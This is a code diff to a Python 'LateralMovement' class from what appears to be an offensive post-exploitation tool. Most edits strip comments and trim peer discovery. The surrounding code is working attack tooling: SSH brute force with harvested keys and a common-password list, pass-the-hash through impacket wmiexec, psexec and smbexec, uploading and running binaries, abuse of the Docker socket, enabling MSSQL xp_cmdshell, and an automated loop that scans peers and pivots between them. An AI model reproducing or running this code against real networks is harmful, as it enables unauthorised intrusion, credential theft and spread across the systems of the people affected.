@@ -193,17 +193,6 @@ class LateralMovement:
         except Exception:
             pass
 
-        # DNS servers from resolv.conf (potential targets)
-        try:
-            with open("/etc/resolv.conf") as f:
-                for line in f:
-                    if line.startswith("nameserver"):
-                        ip = line.split()[1].strip()
-                        if ip not in ("127.0.0.53", "127.0.0.1"):
-                            peers.add((ip, None))
-        except Exception:
-            pass
-
         return list(peers)
 
     @staticmethod
@@ -234,7 +223,6 @@ class LateralMovement:
         if cmd is None:
             cmd = "id; hostname; cat /etc/hostname 2>/dev/null"
 
-        # Write key to temp file if needed
         key_file = None
         is_key = key_or_pass.startswith("-----BEGIN")
 
@@ -246,14 +234,11 @@ class LateralMovement:
                 os.chmod(key_file.name, 0o600)
                 auth_args = ["-i", key_file.name, "-o", "BatchMode=yes", "-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5"]
             else:
-                # Password auth via sshpass
                 auth_args = ["-o", "StrictHostKeyChecking=no", "-o", "ConnectTimeout=5"]
-                # Check if sshpass is available
                 sp_check = subprocess.run(["which", "sshpass"], capture_output=True, timeout=5)
                 if sp_check.returncode != 0:
                     return {"status": False, "detail": "sshpass not available for password auth"}
 
-            # Build the command
             if is_key:
                 ssh_cmd = ["ssh"] + auth_args + [f"{username}@{target}", cmd]
             else:
@@ -293,25 +278,18 @@ class LateralMovement:
             "Password1", "P@ssw0rd", "Welcome1", "changeme",
         ]
 
-        # First try key-based auth with harvested keys
         creds = LateralMovement._harvest_credentials()
         for key_dict in creds.get("ssh_keys", []):
             result = await LateralMovement.ssh(target, username, key_dict["key"])
             if result.get("status"):
                 return result
 
-        # Then try common passwords
         for pwd in common_passwords:
             result = await LateralMovement.ssh(target, username, pwd)
             if result.get("status"):
                 return result
 
-        # Try without username (some boxes allow anonymous SSH)
-        result = await LateralMovement.ssh(target, username, "")
-        if result.get("status"):
-            return result
-
-        return {"status": False, "detail": f"SSH bruteforce exhausted on {target}@{target}"}
+        return {"status": False, "detail": f"SSH bruteforce exhausted on {username}@{target}"}
 
     # ------------------------------------------------------------------ #
     #  WMI Lateral Movement (Windows)
@@ -319,7 +297,7 @@ class LateralMovement:
 
     @staticmethod
     async def wmi(target: str, username: str, password: str = None, hash: str = None, cmd: str = None) -> dict:
-        """WMI lateral movement using impacket or pywinrm.
+        """WMI lateral movement using impacket.
 
         Supports pass-the-hash (NTLM hash) and password auth.
         """
@@ -327,9 +305,7 @@ class LateralMovement:
             cmd = "ipconfig /all & whoami & hostname"
 
         try:
-            # Try impacket-wmiexec for pass-the-hash
             if hash:
-                # Format: LM:NT hash
                 if ":" not in hash:
                     hash = f"aad3b435b51404eeaad3b435b51404ee:{hash}"
                 wmi_cmd = [
@@ -356,7 +332,6 @@ class LateralMovement:
             else:
                 stderr = r.stderr.decode(errors="replace")
                 if "Kerberos" in stderr and "KDC" in stderr:
-                    # Try without Kerberos
                     wmi_cmd.insert(1, "-no-pass")
                     r2 = subprocess.run(wmi_cmd, capture_output=True, timeout=30)
                     if r2.returncode == 0:
@@ -382,7 +357,6 @@ class LateralMovement:
         """
         try:
             if binary:
-                # Write binary to temp, upload via SMB, execute via service
                 tmp_bin = tempfile.NamedTemporaryFile(delete=False, suffix=".exe")
                 tmp_bin.write(binary)
                 tmp_bin.close()
@@ -392,7 +366,6 @@ class LateralMovement:
                 else:
                     cmd = ["impacket-psexec", f"{username}:{password}@{target}", tmp_bin.name]
             else:
-                # Just execute a command
                 if hash:
                     cmd = ["impacket-psexec", "-hashes", hash, f"{username}@{target}", "cmd.exe /c whoami & ipconfig"]
                 else:
@@ -423,12 +396,11 @@ class LateralMovement:
 
     @staticmethod
     async def smb_exec(target: str, username: str, password: str = None, hash: str = None, command: str = None) -> dict:
-        """SMB command execution via impacket-smbexec or netexec."""
+        """SMB command execution via netexec or impacket-smbexec."""
         if command is None:
             command = "whoami"
 
         try:
-            # Use netexec if available (modern)
             nxc_check = subprocess.run(["which", "netexec"], capture_output=True, timeout=5)
             if nxc_check.returncode == 0:
                 if hash:
@@ -445,7 +417,6 @@ class LateralMovement:
                     "output": output,
                 }
 
-            # Fallback to impacket-smbexec
             if hash:
                 cmd = ["impacket-smbexec", "-hashes", hash, f"{username}@{target}", command]
             else:
@@ -481,7 +452,6 @@ class LateralMovement:
                     "shares": r.stdout.decode(errors="replace"),
                 }
 
-            # Fallback to smbclient
             cmd = ["smbclient", "-L", f"//{target}/", "-N"]
             r = subprocess.run(cmd, capture_output=True, timeout=15)
             return {
@@ -532,18 +502,13 @@ class LateralMovement:
 
     @staticmethod
     async def docker_socket(target_ip: str = None) -> dict:
-        """Check if Docker socket is exposed and use it for lateral movement.
-
-        If target_ip is None, checks localhost. Otherwise, checks remote Docker API.
-        """
+        """Check if Docker socket is exposed and use it for lateral movement."""
         if target_ip:
             url = f"http://{target_ip}:2375"
         else:
-            # Check local Docker socket
             docker_sock = "/var/run/docker.sock"
             if os.path.exists(docker_sock):
                 try:
-                    # List containers
                     r = subprocess.run(
                         ["docker", "ps", "--format", "{{.Names}} {{.Image}} {{.Status}}"],
                         capture_output=True, timeout=10,
@@ -560,7 +525,6 @@ class LateralMovement:
                     return {"status": False, "detail": f"Docker socket error: {e}"}
             return {"status": False, "detail": "No Docker socket found locally"}
 
-        # Remote Docker API
         try:
             import httpx
             async with httpx.AsyncClient(timeout=5) as client:
@@ -590,7 +554,6 @@ class LateralMovement:
             command = "whoami"
 
         try:
-            # Use impacket-mssqlclient
             cmd = [
                 "impacket-mssqlclient",
                 f"{username}:{password}@{target}",
@@ -601,7 +564,6 @@ class LateralMovement:
             output = r.stdout.decode(errors="replace")
 
             if "error" not in output.lower() or r.returncode == 0:
-                # Check if xp_cmdshell is disabled — try enabling it
                 if "xp_cmdshell" in output.lower() and "disabled" in output.lower():
                     enable_cmd = [
                         "impacket-mssqlclient",
@@ -610,7 +572,6 @@ class LateralMovement:
                         "-query", "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;",
                     ]
                     subprocess.run(enable_cmd, capture_output=True, timeout=10)
-                    # Retry
                     r = subprocess.run(cmd, capture_output=True, timeout=15)
                     output = r.stdout.decode(errors="replace")
 
@@ -637,8 +598,6 @@ class LateralMovement:
           2. Discover peer hosts
           3. For each reachable peer, try all available methods
           4. Report successful pivots
-
-        Returns a dict of successful lateral moves.
         """
         results = {
             "credentials_harvested": False,
@@ -659,7 +618,7 @@ class LateralMovement:
             "known_hosts": len(creds.get("known_hosts", [])),
         }
 
-        # Step 2: Discover peers (or use provided targets)
+        # Step 2: Discover peers
         if targets:
             peers = [(t, None) for t in targets]
         else:
@@ -667,9 +626,8 @@ class LateralMovement:
 
         results["peers_discovered"] = [p[0] for p in peers]
 
-        # Step 3: For each peer, try lateral movement
+        # Step 3: Try lateral movement on each peer
         for ip, hostname in peers:
-            # Check reachability on common ports
             ports_to_check = [22, 445, 5985, 5986, 3389, 1433, 2375]
             reachable_ports = []
             for port in ports_to_check:
@@ -677,10 +635,7 @@ class LateralMovement:
                     reachable_ports.append(port)
 
             if not reachable_ports:
-                results["failed_attempts"].append({
-                    "target": ip,
-                    "reason": "No common ports open",
-                })
+                results["failed_attempts"].append({"target": ip, "reason": "No common ports open"})
                 continue
 
             peer_result = {
@@ -706,7 +661,7 @@ class LateralMovement:
                     if peer_result["successful_methods"]:
                         break
 
-            # Try SMB (port 445) - check if null session works
+            # Try SMB (port 445)
             if 445 in reachable_ports:
                 smb_result = await LateralMovement.smb_enum_shares(ip)
                 if smb_result.get("status"):
